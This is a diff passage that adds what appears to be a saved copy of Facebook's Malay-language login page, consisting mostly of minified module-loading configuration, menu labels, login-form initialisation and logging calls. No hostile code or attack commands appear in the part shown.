+                    "src": "data:text\/css; charset=utf-8,\u002523bootloader_P_mr5{height:42px;}.bootloader_P_mr5{display:block!important;}",
+                    "nc": 1,
+                    "d": 1
+                }
+            }, []);
+            Bootloader.enableBootload({
+                "BanzaiODS": {
+                    "r": ["istiD", "n52E9", "rr8Vg"],
+                    "rds": {
+                        "m": ["BanzaiODS", "BanzaiScuba"]
+                    }
+                },
+                "BanzaiScuba": {
+                    "r": ["istiD", "n52E9", "rr8Vg"],
+                    "rds": {
+                        "m": ["BanzaiODS", "BanzaiScuba"]
+                    }
+                },
+                "VisualCompletionGating": {
+                    "r": ["qHw1o"]
+                },
+                "Dock": {
+                    "r": ["nOHzA", "HdLm2", "n52E9", "Ikj44", "rr8Vg", "Rh0gh", "istiD", "FQZQE"],
+                    "rds": {
+                        "m": ["BanzaiODS", "BanzaiScuba"]
+                    },
+                    "be": 1
+                },
+                "TimeSliceInteractionsLiteTypedLogger": {
+                    "r": ["pJBuZ", "istiD", "n52E9", "rr8Vg"],
+                    "rds": {
+                        "m": ["BanzaiODS", "BanzaiScuba"]
+                    },
+                    "be": 1
+                },
+                "WebSpeedInteractionsTypedLogger": {
+                    "r": ["OiLyZ", "istiD", "n52E9", "rr8Vg"],
+                    "rds": {
+                        "m": ["BanzaiODS", "BanzaiScuba"]
+                    },
+                    "be": 1
+                },
+                "AsyncRequest": {
+                    "r": ["HdLm2", "n52E9", "rr8Vg", "istiD", "FQZQE"],
+                    "rds": {
+                        "m": ["BanzaiODS", "BanzaiScuba"]
+                    },
+                    "be": 1
+                },
+                "DOM": {
+                    "r": ["n52E9", "rr8Vg", "istiD", "FQZQE"],
+                    "rds": {
+                        "m": ["BanzaiODS", "BanzaiScuba"]
+                    },
+                    "be": 1
+                },
+                "Form": {
+                    "r": ["n52E9", "rr8Vg", "istiD", "FQZQE"],
+                    "rds": {
+                        "m": ["BanzaiODS", "BanzaiScuba"]
+                    },
+                    "be": 1
+                },
+                "FormSubmit": {
+                    "r": ["HdLm2", "qusv+", "n52E9", "rr8Vg", "istiD", "FQZQE"],
+                    "rds": {
+                        "m": ["BanzaiODS", "BanzaiScuba"]
+                    },
+                    "be": 1
+                },
+                "Input": {
+                    "r": ["n52E9"],
+                    "be": 1
+                },
+                "Live": {
+                    "r": ["n52E9", "UWlUh", "qHw1o", "rr8Vg", "2\/maQ", "istiD", "FQZQE"],
+                    "rds": {
+                        "m": ["BanzaiODS", "BanzaiScuba"]
+                    },
+                    "be": 1
+                },
+                "Toggler": {
+                    "r": ["nOHzA", "n52E9", "rr8Vg", "Rh0gh", "istiD", "FQZQE"],
+                    "rds": {
+                        "m": ["BanzaiODS", "BanzaiScuba"]
+                    },
+                    "be": 1
+                },
+                "Tooltip": {
+                    "r": ["nOHzA", "HdLm2", "VpjKC", "n52E9", "rr8Vg", "Rh0gh", "istiD", "FQZQE"],
+                    "rds": {
+                        "m": ["BanzaiODS", "BanzaiScuba"]
+                    },
+                    "be": 1
+                },
+                "URI": {
+                    "r": [],
+                    "be": 1
+                },
+                "trackReferrer": {
+                    "r": [],
+                    "rds": {
+                        "m": ["BanzaiODS", "BanzaiScuba"],
+                        "r": ["istiD", "n52E9", "rr8Vg"]
+                    },
+                    "be": 1
+                },
+                "PhotoTagApproval": {
+                    "r": ["hKKeY", "n52E9", "rr8Vg", "\/mnVq", "istiD", "FQZQE"],
+                    "rds": {
+                        "m": ["BanzaiODS", "BanzaiScuba"]
+                    },
+                    "be": 1
+                },
+                "PhotoSnowlift": {
+                    "r": ["sEH9e", "F2sDX", "2Wj4c", "uKYzh", "FQZQE", "G7W4q", "rQxKI", "nOHzA", "SZF6m", "YJVM9", "zva6n", "GPRqR", "SKyM5", "9vIN5", "HdLm2", "hKKeY", "VpjKC", "n52E9", "68RAo", "Zuwkj", "Ql5yg", "PBgYe", "UWlUh", "IXyT4", "Le3KK", "BgDxx", "o\/H6N", "qHw1o", "gXVUs", "rr8Vg", "T1Fcr", "nCyK4", "Vw6Lb", "AP7eF", "4BbhL", "np5Vl", "smtkO", "Rh0gh", "SV0z9", "istiD", "eA2xC"],
+                    "rds": {
+                        "m": ["BanzaiODS", "BanzaiScuba", "VisualCompletionGating"]
+                    },
+                    "be": 1
+                },
+                "PhotoTagger": {
+                    "r": ["sEH9e", "F2sDX", "2Wj4c", "uKYzh", "FQZQE", "G7W4q", "iZaiH", "nOHzA", "ThdFi", "Arpjm", "SZF6m", "9lOZS", "zJMYB", "tBF0I", "YJVM9", "GPRqR", "VFR1q", "m6q0h", "2tKOj", "PccN6", "oEsh0", "7NHNJ", "P2Tap", "9vIN5", "HdLm2", "3oFMI", "ZNjDW", "hKKeY", "VpjKC", "qusv+", "n52E9", "68RAo", "Zuwkj", "i7D7c", "UWlUh", "IXyT4", "taiwp", "BgDxx", "V6ah8", "qHw1o", "WnvF8", "S59rN", "pWU5e", "rr8Vg", "T1Fcr", "97eN7", "Hn1NR", "Uwlfp", "lFcmZ", "gcDYl", "AP7eF", "eA2xC", "Ah2zJ", "liORJ", "dLfzO", "rUhva", "smtkO", "Rh0gh", "4p\/OI", "CLmH0", "istiD", "hHKKq", "jzmT8", "np5Vl", "QJ2yO", "EE0aD"],
+                    "rdfds": {
+                        "m": ["GamesVideoDeleteCommentDialog.react", "GamesVideoModerationRulesNux.react", "GamesVideoCommentRemovedDialog.react"],
+                        "r": ["nxkK8", "7Lqro", "jqcVb", "d4WqK", "PBgYe", "TUDA+", "1eQSp", "SYsOH", "b0NcP", "ZCxc9"]
+                    },
+                    "rds": {
+                        "m": ["PresenceStatus", "BanzaiODS", "BanzaiScuba", "Banzai", "WebDevicePerfInfoLogging"]
+                    },
+                    "be": 1
+                },
+                "PhotoTags": {
+                    "r": ["hKKeY", "n52E9", "rr8Vg", "\/mnVq", "istiD", "FQZQE"],
+                    "rds": {
+                        "m": ["BanzaiODS", "BanzaiScuba"]
+                    },
+                    "be": 1
+                },
+                "TagTokenizer": {
+                    "r": ["rQxKI", "HdLm2", "n52E9", "Ql5yg", "rr8Vg", "T1Fcr", "\/mnVq", "p1PhX", "OHCTj", "Rh0gh", "istiD", "FQZQE"],
+                    "rds": {
+                        "m": ["BanzaiODS", "BanzaiScuba"]
+                    },
+                    "be": 1
+                },
+                "AsyncDialog": {
+                    "r": ["sEH9e", "FQZQE", "nOHzA", "HdLm2", "n52E9", "rr8Vg", "Rh0gh", "istiD", "eA2xC"],
+                    "rds": {
+                        "m": ["BanzaiODS", "BanzaiScuba"]
+                    },
+                    "be": 1
+                },
+                "Hovercard": {
+                    "r": ["FQZQE", "nOHzA", "PccN6", "HdLm2", "3oFMI", "VpjKC", "qusv+", "n52E9", "qHw1o", "rr8Vg", "T1Fcr", "Rh0gh", "istiD", "jzmT8"],
+                    "rds": {
+                        "m": ["BanzaiODS", "BanzaiScuba"]
+                    },
+                    "be": 1
+                },
+                "Banzai": {
+                    "r": ["istiD", "n52E9", "rr8Vg"],
+                    "rds": {
+                        "m": ["BanzaiODS", "BanzaiScuba"]
+                    },
+                    "be": 1
+                },
+                "ResourceTimingBootloaderHelper": {
+                    "r": ["iT+PG", "rr8Vg"],
+                    "rds": {
+                        "m": ["BanzaiODS", "BanzaiScuba"],
+                        "r": ["istiD", "n52E9"]
+                    },
+                    "be": 1
+                },
+                "TimeSliceHelper": {
+                    "r": ["7S171"],
+                    "be": 1
+                },
+                "XSalesPromoWWWDetailsDialogAsyncController": {
+                    "r": ["gWMJg"],
+                    "be": 1
+                },
+                "BanzaiStream": {
+                    "r": ["ZU1ro", "istiD", "n52E9", "rr8Vg"],
+                    "rds": {
+                        "m": ["BanzaiODS", "BanzaiScuba"]
+                    },
+                    "be": 1
+                },
+                "SnappyCompressUtil": {
+                    "r": ["n52E9"],
+                    "be": 1
+                },
+                "XOfferController": {
+                    "r": ["VwejP"],
+                    "be": 1
+                },
+                "PerfXSharedFields": {
+                    "r": ["qHw1o"],
+                    "be": 1
+                },
+                "KeyEventTypedLogger": {
+                    "r": ["VMKqM", "istiD", "n52E9", "rr8Vg"],
+                    "rds": {
+                        "m": ["BanzaiODS", "BanzaiScuba"]
+                    },
+                    "be": 1
+                },
+                "Animation": {
+                    "r": ["F2sDX", "n52E9", "rr8Vg", "istiD", "FQZQE"],
+                    "rds": {
+                        "m": ["BanzaiODS", "BanzaiScuba"]
+                    },
+                    "be": 1
+                },
+                "Dialog": {
+                    "r": ["F2sDX", "FQZQE", "SZF6m", "GPRqR", "HdLm2", "n52E9", "rr8Vg", "T1Fcr", "Rh0gh", "istiD", "VpjKC", "np5Vl"],
+                    "rds": {
+                        "m": ["BanzaiODS", "BanzaiScuba"]
+                    },
+                    "be": 1
+                },
+                "ExceptionDialog": {
+                    "r": ["sEH9e", "F2sDX", "FQZQE", "nOHzA", "HdLm2", "Andmd", "n52E9", "68RAo", "Zuwkj", "qHw1o", "rr8Vg", "AP7eF", "Rh0gh", "istiD"],
+                    "rds": {
+                        "m": ["BanzaiODS", "BanzaiScuba"]
+                    },
+                    "be": 1
+                },
+                "ReactDOM": {
+                    "r": ["rr8Vg", "n52E9", "eA2xC", "FQZQE"],
+                    "rds": {
+                        "m": ["BanzaiODS", "BanzaiScuba"],
+                        "r": ["istiD"]
+                    },
+                    "be": 1
+                },
+                "QuickSandSolver": {
+                    "r": ["8ELCB", "HdLm2", "n52E9", "+ClWy", "rr8Vg", "0lLrn", "istiD", "FQZQE"],
+                    "rds": {
+                        "m": ["BanzaiODS", "BanzaiScuba"]
+                    },
+                    "be": 1
+                },
+                "ConfirmationDialog": {
+                    "r": ["n52E9", "oE4Do", "rr8Vg", "istiD", "FQZQE"],
+                    "rds": {
+                        "m": ["BanzaiODS", "BanzaiScuba"]
+                    },
+                    "be": 1
+                },
+                "XUIDialogButton.react": {
+                    "r": ["sEH9e", "FQZQE", "nOHzA", "HdLm2", "n52E9", "Zuwkj", "rr8Vg", "istiD"],
+                    "rds": {
+                        "m": ["BanzaiODS", "BanzaiScuba"]
+                    },
+                    "be": 1
+                },
+                "XUIDialogBody.react": {
+                    "r": ["FQZQE", "nOHzA", "Zuwkj", "rr8Vg", "AP7eF", "istiD", "n52E9"],
+                    "rds": {
+                        "m": ["BanzaiODS", "BanzaiScuba"]
+                    },
+                    "be": 1
+                },
+                "XUIDialogFooter.react": {
+                    "r": ["FQZQE", "nOHzA", "Zuwkj", "rr8Vg", "AP7eF", "Rh0gh", "istiD", "n52E9"],
+                    "rds": {
+                        "m": ["BanzaiODS", "BanzaiScuba"]
+                    },
+                    "be": 1
+                },
+                "XUIDialogTitle.react": {
+                    "r": ["sEH9e", "FQZQE", "nOHzA", "HdLm2", "n52E9", "rr8Vg", "Rh0gh", "istiD"],
+                    "rds": {
+                        "m": ["BanzaiODS", "BanzaiScuba"]
+                    },
+                    "be": 1
+                },
+                "XUIGrayText.react": {
+                    "r": ["FQZQE", "rr8Vg", "AP7eF", "istiD", "n52E9"],
+                    "rds": {
+                        "m": ["BanzaiODS", "BanzaiScuba"]
+                    },
+                    "be": 1
+                },
+                "PageTransitions": {
+                    "r": ["SZF6m", "HdLm2", "VpjKC", "n52E9", "rr8Vg", "np5Vl", "istiD", "FQZQE"],
+                    "rds": {
+                        "m": ["BanzaiODS", "BanzaiScuba"]
+                    },
+                    "be": 1
+                },
+                "DialogX": {
+                    "r": ["FQZQE", "nOHzA", "HdLm2", "n52E9", "rr8Vg", "Rh0gh", "istiD"],
+                    "rds": {
+                        "m": ["BanzaiODS", "BanzaiScuba"]
+                    },
+                    "be": 1
+                },
+                "ContextualLayerInlineTabOrder": {
+                    "r": ["qusv+", "n52E9", "rr8Vg", "Rh0gh", "istiD", "FQZQE"],
+                    "rds": {
+                        "m": ["BanzaiODS", "BanzaiScuba"]
+                    },
+                    "be": 1
+                },
+                "React": {
+                    "r": ["rr8Vg"],
+                    "be": 1
+                }
+            });
+        });
+    </script>
+    <script>
+        requireLazy(["InitialJSLoader"], function(InitialJSLoader) {
+            InitialJSLoader.loadOnDOMContentReady(["qHw1o", "Ql5yg", "SZF6m", "VpjKC", "n52E9", "rr8Vg", "istiD", "8nyZ9", "Ikj44", "F2sDX", "HdLm2", "Zuwkj", "LmXGv", "SJElA", "np5Vl", "SV0z9", "eA2xC", "P\/mr5"]);
+        });
+    </script>
+    <script>
+        require("TimeSliceImpl").guard(function() {
+            require("ServerJSDefine").handleDefines([
+                ["cr:1183579", ["InlineFbtResultImpl"], {
+                    "__rc": ["InlineFbtResultImpl", "Aa16twE6ppfFhJTF8Q8r8afteGbwVEcwkkjIEwsBPBCyZX0ckdoZBITMdmPAulvni08eLi8fEnly_rNQyLFe9p8"]
+                }, -1],
+                ["AsyncRequestConfig", [], {
+                    "retryOnNetworkError": "1",
+                    "useFetchStreamAjaxPipeTransport": false
+                }, 328],
+                ["FbtLogger", [], {
+                    "logger": null
+                }, 288],
+                ["FbtQTOverrides", [], {
+                    "overrides": {}
+                }, 551],
+                ["FbtResultGK", [], {
+                    "shouldReturnFbtResult": true,
+                    "inlineMode": "NO_INLINE"
+                }, 876],
+                ["IntlPhonologicalRules", [], {
+                    "meta": {},
+                    "patterns": {}
+                }, 1496],
+                ["IntlViewerContext", [], {
+                    "GENDER": 3
+                }, 772],
+                ["NumberFormatConfig", [], {
+                    "decimalSeparator": ".",
+                    "numberDelimiter": ",",
+                    "minDigitsForThousandsSeparator": 4,
+                    "standardDecimalPatternInfo": {
+                        "primaryGroupSize": 3,
+                        "secondaryGroupSize": 3
+                    },
+                    "numberingSystemData": null
+                }, 54],
+                ["SessionNameConfig", [], {
+                    "seed": "1doQ"
+                }, 757],
+                ["KSConfig", [], {
+                    "killed": {
+                        "__set": ["POCKET_MONSTERS_CREATE", "POCKET_MONSTERS_DELETE", "VIDEO_DIMENSIONS_FROM_PLAYER_IN_UPLOAD_DIALOG", "POCKET_MONSTERS_UPDATE_NAME", "ADS_PLACEMENT_FIX_PUBLISHER_PLATFORMS_MUTATION", "MOBILITY_KILL_OLD_VISIBILITY_POSITION_SETTING", "WORKPLACE_DISPLAY_TEXT_EVIDENCE_REPORTING", "DYNAMIC_ADS_SET_CATALOG_AND_PRODUCT_SET_TOGETHER", "BUSINESS_GRAPH_SETTING_APP_ASSIGNED_USERS_NEW_API", "BUSINESS_GRAPH_SETTING_WABA_ASSIGNED_USERS_NEW_API", "BUSINESS_GRAPH_SETTING_ESG_ASSIGNED_USERS_NEW_API", "BUSINESS_GRAPH_SETTING_PRODUCT_CATALOG_ASSIGNED_USERS_NEW_API", "BUSINESS_MANAGER_SHOW_UI_HIDDEN_TASK_FOR_ASSET", "BUSINESS_GRAPH_SETTING_BU_ASSIGNED_USERS_NEW_API", "BUSINESS_GRAPH_SETTING_SESG_ASSIGNED_USERS_NEW_API", "RECRUITING_REQUISITION_VALIDATE_COMPANY_GROUPING_ON_LINK"]
+                    },
+                    "ko": {
+                        "__set": ["acrJTh9WGdp", "1oOE64fL4wO", "2dhqRnqXGLQ", "7r6mSP7ofr2", "1ntjZ2zgf03", "3oh5Mw86USj", "8NAceEy9JZo", "5mNEXob0nTj", "4j36SVzvP3w", "8PlKuowafe8", "53gCxKq281G", "3yzzwBY7Npj", "4NbCsulUUI3", "4NSq3ZC4ScE", "1onzIv0jH6H", "5LSlJUj3BnT"]
+                    }
+                }, 2580],
+                ["IntlHoldoutGK", [], {
+                    "inIntlHoldout": false
+                }, 2827],
+                ["IntlNumberTypeConfig", [], {
+                    "impl": "return IntlVariations.NUMBER_OTHER;"
+                }, 3405],
+                ["LinkshimHandlerConfig", [], {
+                    "supports_meta_referrer": true,
+                    "default_meta_referrer_policy": "origin-when-crossorigin",
+                    "switched_meta_referrer_policy": "origin",
+                    "non_linkshim_lnfb_mode": null,
+                    "link_react_default_hash": "AT304NqMmFdWP3f7LjihQmFTfIZqJ_63st0eGFn3bDpJkV5EDBaoiq86XOZI2XiXrqzql3JIJTsixRtMY8HtdJ3fHWrnj1O1XjZBKAudd_cev46-0oTC9d70gPZ055lbZYwhojixg0JoLUMwGeXhqd_8_PXIgdNdCnJSwQ",
+                    "untrusted_link_default_hash": "AT21P5KVm9_oNGypMbjZYQIY6H_V07sQPm3AsuMZfAeFkh4EIXl73k463e6jYURhD3ncKylbt13r_3Ix7_qr_6hIW5ZQJ56JxR0cGl7pz6ufrw8oeBT3rkc_01HxVlia2vTzEU_gPUL3s4BsYFQJ4xLcKxhmnNc3__-LxA",
+                    "linkshim_host": "l.facebook.com",
+                    "use_rel_no_opener": true,
+                    "always_use_https": true,
+                    "onion_always_shim": true,
+                    "middle_click_requires_event": true,
+                    "www_safe_js_mode": "asynclazy",
+                    "m_safe_js_mode": "MLynx_asynclazy",
+                    "ghl_param_link_shim": false,
+                    "click_ids": [],
+                    "is_linkshim_supported": true,
+                    "current_domain": "facebook.com"
+                }, 27]
+            ]);
+            require("InitialJSLoader").handleServerJS({
+                "instances": [
+                    ["__inst_5b4d0c00_0_0", ["Menu", "XUIMenuWithSquareCorner", "XUIMenuTheme"],
+                        [
+                            [], {
+                                "id": "u_0_0",
+                                "behaviors": [{
+                                    "__m": "XUIMenuWithSquareCorner"
+                                }],
+                                "theme": {
+                                    "__m": "XUIMenuTheme"
+                                }
+                            }
+                        ], 2
+                    ],
+                    ["__inst_5b4d0c00_0_1", ["Menu", "MenuItem", "__markup_3310c079_0_0", "HTML", "__markup_3310c079_0_1", "__markup_3310c079_0_2", "__markup_3310c079_0_3", "XUIMenuWithSquareCorner", "XUIMenuTheme"],
+                        [
+                            [{
+                                "value": "key_shortcuts",
+                                "ctor": {
+                                    "__m": "MenuItem"
+                                },
+                                "markup": {
+                                    "__m": "__markup_3310c079_0_0"
+                                },
+                                "label": "Bantuan pintasan papan kekunci...",
+                                "title": "",
+                                "className": null
+                            }, {
+                                "href": "\/help\/accessibility",
+                                "target": "_blank",
+                                "value": "help_center",
+                                "ctor": {
+                                    "__m": "MenuItem"
+                                },
+                                "markup": {
+                                    "__m": "__markup_3310c079_0_1"
+                                },
+                                "label": "Pusat Bantuan Kebolehcapaian",
+                                "title": "",
+                                "className": null
+                            }, {
+                                "href": "\/help\/contact\/accessibility",
+                                "target": "_blank",
+                                "value": "submit_feedback",
+                                "ctor": {
+                                    "__m": "MenuItem"
+                                },
+                                "markup": {
+                                    "__m": "__markup_3310c079_0_2"
+                                },
+                                "label": "Hantar maklum balas",
+                                "title": "",
+                                "className": null
+                            }, {
+                                "href": "\/accessibility",
+                                "target": "_blank",
+                                "value": "facebook_page",
+                                "ctor": {
+                                    "__m": "MenuItem"
+                                },
+                                "markup": {
+                                    "__m": "__markup_3310c079_0_3"
+                                },
+                                "label": "Kemas Kini daripada Kebolehcapaian Facebook",
+                                "title": "Kemas Kini daripada Kebolehcapaian Facebook",
+                                "className": null
+                            }], {
+                                "id": "u_0_1",
+                                "behaviors": [{
+                                    "__m": "XUIMenuWithSquareCorner"
+                                }],
+                                "theme": {
+                                    "__m": "XUIMenuTheme"
+                                }
+                            }
+                        ], 2
+                    ],
+                    ["__inst_e5ad243d_0_0", ["PopoverMenu", "__inst_1de146dc_0_1", "__elem_ec77afbd_0_1", "__inst_5b4d0c00_0_1"],
+                        [{
+                                "__m": "__inst_1de146dc_0_1"
+                            }, {
+                                "__m": "__elem_ec77afbd_0_1"
+                            }, {
+                                "__m": "__inst_5b4d0c00_0_1"
+                            },
+                            []
+                        ], 2
+                    ],
+                    ["__inst_e5ad243d_0_1", ["PopoverMenu", "__inst_1de146dc_0_0", "__elem_ec77afbd_0_0", "__inst_5b4d0c00_0_0"],
+                        [{
+                                "__m": "__inst_1de146dc_0_0"
+                            }, {
+                                "__m": "__elem_ec77afbd_0_0"
+                            }, {
+                                "__m": "__inst_5b4d0c00_0_0"
+                            },
+                            []
+                        ], 2
+                    ],
+                    ["__inst_1de146dc_0_0", ["Popover", "__elem_1de146dc_0_0", "__elem_ec77afbd_0_0", "ContextualLayerAutoFlip", "ContextualDialogArrow"],
+                        [{
+                                "__m": "__elem_1de146dc_0_0"
+                            }, {
+                                "__m": "__elem_ec77afbd_0_0"
+                            },
+                            [{
+                                "__m": "ContextualLayerAutoFlip"
+                            }, {
+                                "__m": "ContextualDialogArrow"
+                            }], {
+                                "alignh": "left",
+                                "position": "below"
+                            }
+                        ], 2
+                    ],
+                    ["__inst_1de146dc_0_1", ["Popover", "__elem_1de146dc_0_1", "__elem_ec77afbd_0_1", "ContextualLayerAutoFlip", "ContextualDialogArrow"],
+                        [{
+                                "__m": "__elem_1de146dc_0_1"
+                            }, {
+                                "__m": "__elem_ec77afbd_0_1"
+                            },
+                            [{
+                                "__m": "ContextualLayerAutoFlip"
+                            }, {
+                                "__m": "ContextualDialogArrow"
+                            }], {
+                                "alignh": "right",
+                                "position": "below"
+                            }
+                        ], 2
+                    ]
+                ],
+                "markup": [
+                    ["__markup_3310c079_0_0", {
+                        "__html": "Bantuan pintasan papan kekunci..."
+                    }, 1],
+                    ["__markup_3310c079_0_1", {
+                        "__html": "Pusat Bantuan Kebolehcapaian"
+                    }, 1],
+                    ["__markup_3310c079_0_2", {
+                        "__html": "Hantar maklum balas"
+                    }, 1],
+                    ["__markup_3310c079_0_3", {
+                        "__html": "Kemas Kini daripada Kebolehcapaian Facebook"
+                    }, 1]
+                ],
+                "elements": [
+                    ["__elem_a588f507_0_1", "u_0_2", 1],
+                    ["__elem_3fc3da18_0_0", "u_0_3", 1],
+                    ["__elem_51be6cb7_0_0", "u_0_4", 1],
+                    ["__elem_1de146dc_0_0", "u_0_5", 1],
+                    ["__elem_ec77afbd_0_0", "u_0_6", 2],
+                    ["__elem_1de146dc_0_1", "u_0_7", 1],
+                    ["__elem_ec77afbd_0_1", "u_0_8", 2],
+                    ["__elem_9f5fac15_0_0", "pagelet_bluebar", 1],
+                    ["__elem_45e94dd8_0_0", "pagelet_bluebar", 1],
+                    ["__elem_a588f507_0_0", "globalContainer", 2],
+                    ["__elem_a588f507_0_2", "content", 1],
+                    ["__elem_835c633a_0_0", "login_form", 2],
+                    ["__elem_f46f4946_0_0", "u_0_9", 1],
+                    ["__elem_f46f4946_0_1", "u_0_a", 1],
+                    ["__elem_45d73b5d_0_0", "loginbutton", 1]
+                ],
+                "require": [
+                    ["WebPixelRatioDetector", "startDetecting", [],
+                        [false]
+                    ],
+                    ["ServiceWorkerLoginAndLogout", "login", [],
+                        []
+                    ],
+                    ["ScriptPath", "set", [],
+                        ["WebLoginPageController", "01afab33", {
+                            "imp_id": "0sfaxAgcA9cEox6vr",
+                            "ef_page": null,
+                            "uri": "https:\/\/www.facebook.com\/login\/device-based\/regular\/login"
+                        }]
+                    ],
+                    ["UITinyViewportAction", "init", [],
+                        []
+                    ],
+                    ["ResetScrollOnUnload", "init", ["__elem_a588f507_0_0"],
+                        [{
+                            "__m": "__elem_a588f507_0_0"
+                        }]
+                    ],
+                    ["AccessibilityWebVirtualCursorClickLogger", "init", ["__elem_45e94dd8_0_0", "__elem_a588f507_0_0"],
+                        [
+                            [{
+                                "__m": "__elem_45e94dd8_0_0"
+                            }, {
+                                "__m": "__elem_a588f507_0_0"
+                            }]
+                        ]
+                    ],
+                    ["KeyboardActivityLogger", "init", [],
+                        []
+                    ],
+                    ["FocusRing", "init", [],
+                        []
+                    ],
+                    ["HardwareCSS", "init", [],
+                        []
+                    ],
+                    ["NavigationAssistantController", "init", ["__elem_3fc3da18_0_0", "__elem_51be6cb7_0_0", "__inst_5b4d0c00_0_0", "__inst_5b4d0c00_0_1", "__inst_e5ad243d_0_0", "__inst_e5ad243d_0_1"],
+                        [{
+                            "__m": "__elem_3fc3da18_0_0"
+                        }, {
+                            "__m": "__elem_51be6cb7_0_0"
+                        }, {
+                            "__m": "__inst_5b4d0c00_0_0"
+                        }, {
+                            "__m": "__inst_5b4d0c00_0_1"
+                        }, null, {
+                            "accessibilityPopoverMenu": {
+                                "__m": "__inst_e5ad243d_0_0"
+                            },
+                            "globalPopoverMenu": null,
+                            "sectionsPopoverMenu": {
+                                "__m": "__inst_e5ad243d_0_1"
+                            }
+                        }]
+                    ],
+                    ["__inst_e5ad243d_0_1"],
+                    ["__inst_1de146dc_0_0"],
+                    ["__inst_e5ad243d_0_0"],
+                    ["__inst_1de146dc_0_1"],
+                    ["AsyncRequestNectarLogging"],
+                    ["IntlUtils"],
+                    ["FBLynx", "setupDelegation", [],
+                        []
+                    ],
+                    ["TimezoneAutoset", "setInputValue", ["__elem_f46f4946_0_0"],
+                        [{
+                            "__m": "__elem_f46f4946_0_0"
+                        }, 1580001493]
+                    ],
+                    ["ScreenDimensionsAutoSet", "setInputValue", ["__elem_f46f4946_0_1"],
+                        [{
+                            "__m": "__elem_f46f4946_0_1"
+                        }]
+                    ],
+                    ["LoginFormController", "init", ["__elem_835c633a_0_0", "__elem_45d73b5d_0_0"],
+                        [{
+                            "__m": "__elem_835c633a_0_0"
+                        }, {
+                            "__m": "__elem_45d73b5d_0_0"
+                        }, null, true]
+                    ],
+                    ["PlatformDialogCBTSetter", "setCBTInFormAndLog", ["__elem_835c633a_0_0"],
+                        [{
+                            "__m": "__elem_835c633a_0_0"
+                        }, "client_logged_out_init_impression"]
+                    ],
+                    ["BrowserPrefillLogging", "initContactpointFieldLogging", [],
+                        [{
+                            "contactpointFieldID": "email",
+                            "serverPrefill": ""
+                        }]
+                    ],
+                    ["BrowserPrefillLogging", "initPasswordFieldLogging", [],
+                        [{
+                            "passwordFieldID": "pass"
+                        }]
+                    ],
+                    ["FocusListener"],
+                    ["FlipDirectionOnKeypress"],
+                    ["TimeSliceImpl"],
+                    ["ServerJSDefine"],
+                    ["InitialJSLoader"]
+                ],
+                "contexts": [
+                    [{
+                        "__m": "__elem_a588f507_0_1"
+                    }, true],
+                    [{
+                        "__m": "__elem_9f5fac15_0_0"
+                    }, false],
+                    [{
+                        "__m": "__elem_a588f507_0_2"
+                    }, true]
+                ]
+            });
+        }, "ServerJS define", {
+            "root": true
+        })();
+    </script>
+    <script>
+        var bigPipe = new(require("BigPipe"))({
+            "forceFinish": true,
+            "config": {
+                "flush_pagelets_asap": true,
+                "dispatch_pagelet_replayable_actions": false
+            }
+        });
+    </script>
+    <script>
+        bigPipe.beforePageletArrive("first_response")
+    </script>
+    <script>
+        require("TimeSlice").guard((function() {
+            bigPipe.onPageletArrive({
+                allResources: ["Rh0gh", "qHw1o", "T1Fcr", "ccHw5", "Ql5yg", "FQZQE", "nOHzA", "SZF6m", "VpjKC", "n52E9", "rr8Vg", "istiD", "8nyZ9", "Ikj44", "F2sDX", "HdLm2", "Zuwkj", "VAuIp", "ZNjDW", "LmXGv", "SJElA", "P/mr5", "np5Vl", "SV0z9", "eA2xC"],
+                displayResources: ["Rh0gh", "T1Fcr", "ccHw5", "FQZQE", "nOHzA", "n52E9", "rr8Vg", "istiD", "HdLm2", "VAuIp", "ZNjDW", "P/mr5"],
+                id: "first_response",
+                phase: 0,
+                last_in_phase: true,
+                tti_phase: 0,
+                all_phases: [63]
+            });
+        }), "onPageletArrive first_response", {
+            "root": true,
+            "pagelet": "first_response"
+        })();
+    </script>
+    <script>
+        bigPipe.setPageID("6786054741145932560-0");
+        CavalryLogger.setPageID("6786054741145932560-0");
+    </script>
+    <script>
+        bigPipe.beforePageletArrive("last_response")
+    </script>
+    <script>
+        require("TimeSlice").guard((function() {
+            bigPipe.onPageletArrive({
+                resource_map: {
+                    JUDVa: {
+                        type: "js",
+                        src: "https://static.xx.fbcdn.net/rsrc.php/v3/ye/r/P49BDLHWNHz.js?_nc_x=Ij3Wp8lg5Kz"
+                    },
+                    FEt5G: {
+                        type: "js",
+                        src: "https://static.xx.fbcdn.net/rsrc.php/v3/y7/r/svFKQXueTby.js?_nc_x=Ij3Wp8lg5Kz"
+                    }
+                },
+                allResources: ["Rh0gh", "qHw1o", "T1Fcr", "ccHw5", "Ql5yg", "FQZQE", "nOHzA", "SZF6m", "VpjKC", "n52E9", "rr8Vg", "istiD", "8nyZ9", "Ikj44", "F2sDX", "HdLm2", "Zuwkj", "VAuIp", "ZNjDW", "LmXGv", "SJElA", "P/mr5", "np5Vl", "SV0z9", "eA2xC", "iT+PG", "JUDVa", "FEt5G"],
+                displayResources: ["Rh0gh", "T1Fcr", "ccHw5", "FQZQE", "nOHzA", "n52E9", "rr8Vg", "istiD", "HdLm2", "VAuIp", "ZNjDW", "P/mr5"],
+                onafterload: ["CavalryLogger.getInstance(\"6786054741145932560-0\").collectBrowserTiming(window)", "window.CavalryLogger&&CavalryLogger.getInstance().setTimeStamp(\"t_paint\");", "if (window.ExitTime){CavalryLogger.getInstance(\"6786054741145932560-0\").setValue(\"t_exit\", window.ExitTime);};"],
+                id: "last_response",
+                phase: 63,
+                jsmods: {
+                    require: [
+                        ["TrackingPixel", "loadWithNoReferrer", [],
+                            ["https://cx.atdmt.com/?f=AYxCqg2snbqO3MqJGb3PXEotp6BXjmR_balC8molnapQi-dCBRrQdIFdmmhGc8KsYVf4VYICxEJQchWQc0_k0Xfa&c=651201109&v=1&l=2"]
+                        ],
+                        ["CavalryLoggerImpl", "startInstrumentation", [],
+                            []
+                        ],
+                        ["NavigationMetrics", "setPage", [],
+                            [{
+                                page: "WebLoginPageController",
+                                page_type: "normal",
+                                page_uri: "https://www.facebook.com/login/device-based/regular/login",
+                                serverLID: "6786054741145932560-0"
+                            }]
+                        ],
+                        ["Chromedome", "start", [],
+                            [
+                                []
+                            ]
+                        ],
+                        ["DimensionTracking"],
+                        ["HighContrastMode", "init", [],
+                            [{
+                                isHCM: false,
+                                spacerImage: "https://static.xx.fbcdn.net/rsrc.php/v3/y4/r/-PAXP-deijE.gif"
+                            }]
+                        ],
+                        ["ErrorLogging"],
+                        ["ClickRefLogger"],
+                        ["DetectBrokenProxyCache", "run", [],
+                            [0, "c_user"]
